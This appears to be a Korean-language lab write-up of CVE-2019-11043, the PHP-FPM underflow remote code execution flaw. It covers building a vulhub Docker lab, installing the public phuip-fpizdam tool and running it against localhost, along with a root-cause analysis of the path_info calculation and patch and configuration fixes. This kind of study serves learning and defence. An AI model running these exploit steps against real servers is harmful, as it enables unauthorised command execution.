# CVE-2019-11043

웹서버와 PHP를 연결해주는 기능인 PHP-FPM 에서 취약점 발생
<br>

## 0. 취약한 환경 버전

> PHP FPM 7.1.x ~ 7.1.33 

> PHP FPM 7.2.x ~ 7.2.24

> PHP FPM 7.3.x ~ 7.3.11

<br>

## 1. 환경 구성

> **ubuntu 20.04**
>
> **docker**
>
> **golang**

<br>

> CVE-2019-11043 폴더 생성

```
mkdir CVE-2019-11043
```

<br>

> CVE-2019-11403 폴더 내 도커 파일 다운

```
wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/default.conf
wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/docker-compose.yml
```

<br>

> CVE-2019-11043에 하위 폴더 www 생성

```
CVE-2019-11043$ mkdir www
```

<br>

> www폴더 내 인덱스 페이지 다운

```
wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/www/index.php
```

<br>

> 폴더 내 파일 확인

![1](https://user-images.githubusercontent.com/89399749/144745932-4312a5ca-5e6d-4a93-9be1-08113b5d1b71.png)

{이미지}

<br>

> CVE-2019-11043 폴더에서 컨테이너 생성 및 백그라운드 실행

```
docker-compose up -d
```

![2](https://user-images.githubusercontent.com/89399749/144745941-8b64ec89-11ae-4093-897f-1b031b490eb5.png)

{이미지2}


![3](https://user-images.githubusercontent.com/89399749/144745945-c45ceb58-b102-4fb7-ab93-d72718b40d27.png)

{이미지3}



> 인덱스 페이지 접속 확인

![4](https://user-images.githubusercontent.com/89399749/144745961-46b75f47-f859-4a5b-8b05-7f0e9aa6c8bb.png)

{이미지4}

<br>

## 2. PoC

일반 사용자로 전환

<br>

> golang 설치

```
apt-get install golang
```
<br>


> phuip-fpizdam 다운로드

```
go get github.com/neex/phuip-fpizdam
go install github.com/neex/phuip-fpizdam
```
![5](https://user-images.githubusercontent.com/89399749/144745958-7a2c1862-836f-4e7f-829c-2f80f3575a5c.png)


{이미지5}

<br>

> exploit 실행

```
./phuip-fpizdam http://localhost:8080/index.php
```

![6](https://user-images.githubusercontent.com/89399749/144745965-ee18a087-155a-4e45-ad89-93bb11e874b0.png)

{이미지6}

<br>

> 원격 명령어 실행

![7](https://user-images.githubusercontent.com/89399749/144745970-5af4bfa2-5661-4622-8279-3e40ab9d56e3.png)

{이미지7}

![8](https://user-images.githubusercontent.com/89399749/144745976-a785d5c8-b495-4c53-9394-365c1649e27d.png)


{이미지8}

<br>

## 3. 원인 분석

> php 소스코드 중 path_info에 env_path_info의 산술 연산된 값을 넣는 부분이 있는데, 해당 부분에서 연산된 값에 대한 검증이 없어 취약점 발생

```php
if (apache_was_here) {
 path_info = script_path_translated + ptlen;
 tflag = (slen != 0 && (!orig_path_info || strcmp(orig_path_info, path_info) != 0));
   } else {
     path_info = (env_path_info && pilen > slen) ? env_path_info + pilen - slen : NULL;
     tflag = path_info && (orig_path_info != path_info);
   }
```

<br>

> 공격자가 URL과 쿼리 문자열 길이를 정확하게 맞추면, PATH_INFO를 _fcgi_data_seg의 첫번째 바이트(*pos)로 지정할 수 있고, pos에 0이 들어가면, Underflow가 발생

```c++
typedef struct _fcgi_data_seg {
    char                  *pos;
    char                  *end;
    struct _fcgi_data_seg *next;
    char                   data[1];
} fcgi_data_seg;
```

<br>

> 타겟을 대상으로 다수의 요청이 발생되어 공격자는 다수의 요청 중 길이가 맞는 요청값을 통해 취약점이 발생

![9](https://user-images.githubusercontent.com/89399749/144745979-64f03e69-3b0b-47eb-9f8a-3c7b67d688f1.jpg)

{이미지9}

<br>

## 4. 대응 방안

> 패치 버전 7.3.11 , 7.2.24 업그레이드

![10](https://user-images.githubusercontent.com/89399749/144745982-77737cd2-8de1-4a85-91b3-9deb176bf074.png)

{이미지10}

<br>

>  try_files 포함 혹은 if문을 통한 검증 코드 구현

## 참조

https://qiita.com/shimizukawasaki/items/39d68a7c658dfa50263d

https://github.com/neex/phuip-fpizdam

https://www.hahwul.com/2019/10/28/php7-underflow-rce-vulnerabliity/

https://saltlee.tistory.com/77



